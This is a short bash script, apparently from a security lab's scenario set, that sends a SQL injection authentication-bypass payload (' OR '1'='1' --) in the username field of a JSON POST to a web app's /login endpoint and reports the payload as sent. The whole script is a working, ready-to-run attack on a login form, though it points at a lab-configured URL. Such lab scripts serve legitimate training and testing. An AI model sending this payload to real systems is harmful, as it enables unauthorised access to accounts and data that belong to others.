#!/bin/bash
ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
# shellcheck source=../linux_run/lab_env.sh
. "$ROOT/linux_run/lab_env.sh"

echo "========================================="
echo "Scenario 1 - SQL Injection Auth Bypass"
echo "========================================="
curl -s -X POST "${WEBAPP_URL}/login" \
    -H "Content-Type: application/json" \
    -d '{
        "username":"'\'' OR '\''1'\''='\''1'\'' -- ",
        "password":"anything"
    }'
echo
echo "[✓] SQLi payload sent."
